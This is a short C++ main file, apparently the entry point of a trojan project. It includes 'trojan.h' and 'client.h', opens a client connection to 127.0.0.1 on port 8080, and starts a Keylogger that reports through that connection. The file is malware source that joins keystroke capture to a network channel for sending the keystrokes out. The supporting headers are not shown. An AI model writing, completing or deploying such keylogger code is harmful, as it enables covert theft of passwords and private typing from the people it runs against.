#include "trojan.h"
#include "client.h"

int main()
{
	Client client(8080, "127.0.0.1");
	client.c_connect();
	Keylogger k;
	k.start(&client);
}